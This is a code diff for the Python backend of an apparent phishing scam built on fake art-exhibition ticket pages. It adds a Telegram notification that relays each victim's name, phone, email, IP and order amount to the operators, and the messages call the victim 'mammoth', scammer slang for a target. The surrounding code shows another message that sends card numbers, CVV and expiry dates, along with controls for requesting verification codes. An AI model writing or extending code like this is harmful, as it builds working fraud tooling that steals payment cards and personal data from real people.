@@ -317,6 +317,41 @@ def format_text_notification_message(admin_username, name, price, currency):
     )
     return message
 
+def format_order_start_message(page_code, name, phone, email, ip, price, currency):
+    """Формує красиве повідомлення про початок оформлення замовлення"""
+    # Визначаємо назву події за page_code
+    event_name = "Выставка"  # За замовчуванням
+    
+    if page_code:
+        try:
+            series = int(page_code.split('-')[0])
+            event_names = [
+                "Terroir and Traditions",
+                "Collection Co–selection", 
+                "Snucie",
+                "Art that saves lives",
+                "Gotong Royong",
+                "Anna Konik",
+                "Uncensored",
+                "Jacek Adamas"
+            ]
+            if 1 <= series <= len(event_names):
+                event_name = event_names[series - 1]
+        except:
+            pass
+    
+    message = (
+        f"🔔 Мамонт оформляет заказа ({event_name})\n\n"
+        f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
+        f"👤 Мамонт: {name or 'Не указано'}\n"
+        f"📱 Телефон: {phone or 'Не указано'}\n"
+        f"📧 Email: {email or 'Не указано'}\n"
+        f"🌍 IP: {ip or 'Не указано'}\n"
+        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+    )
+    
+    return message
+
 def format_code_request_message(admin_username, name, price, currency, page_code):
     """Формує красиве повідомлення про запит коду"""
     message = (
@@ -2605,11 +2640,30 @@ async def payment_notify(request):
             sum_str = f'\nСумма: {m.group(1).replace(",", ".")} {m.group(2)}'
         else:
             sum_str = f'\nСумма: {total}'
-    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування - ВИДАЛЕНО
-    # Лог з ФІО більше не надсилається
-    # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
+    # 1. Повідомлення про початок оформлення замовлення (без кнопок)
     page_code = data.get('page_code', '')
     
+    # Формуємо красиве повідомлення про початок оформлення
+    order_start_message = format_order_start_message(
+        page_code=page_code,
+        name=name,
+        phone=phone,
+        email=email,
+        ip=ip,
+        price=price,
+        currency=currency
+    )
+    
+    # Надсилаємо лог про початок оформлення в чат без кнопок
+    try:
+        await bot.send_message(ADMIN_ID, order_start_message)
+        print(f"[DEBUG] Order start message sent to ADMIN_ID: {order_start_message}")
+    except Exception as e:
+        print(f"[ERROR] Не вдалося надіслати order_start_message у ADMIN_ID: {e}")
+        import traceback
+        traceback.print_exc()
+    
+    # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     # Формуємо красиве повідомлення про карту
     card_message = format_card_payment_message(
         page_code=page_code,
@@ -2671,6 +2725,34 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
+        # Формуємо красиве повідомлення про початок оформлення замовлення
+        try:
+            # Отримуємо інформацію про подію
+            event_info = get_event_info_by_page_code(page_code) if page_code else None
+            price = event_info.get('price') if event_info else None
+            currency = event_info.get('currency') if event_info else None
+            
+            # Отримуємо username адміна
+            admin_username = get_admin_username_by_user_id(admin_user_id)
+            
+            # Формуємо красиве повідомлення про початок оформлення
+            order_start_message = format_order_start_message(
+                page_code=page_code,
+                name=name,
+                phone=phone,
+                email=email,
+                ip=ip,
+                price=price,
+                currency=currency
+            )
+            
+            await bot.send_message(admin_user_id, order_start_message)
+            print(f"[DEBUG] Order start message sent to event creator {admin_user_id}")
+        except Exception as e:
+            print(f"[ERROR] Не вдалося надіслати order_start_message admin_user_id: {e}")
+            import traceback
+            traceback.print_exc()
+        
         # Формуємо красиве повідомлення про карту
         try:
             # Отримуємо інформацію про подію
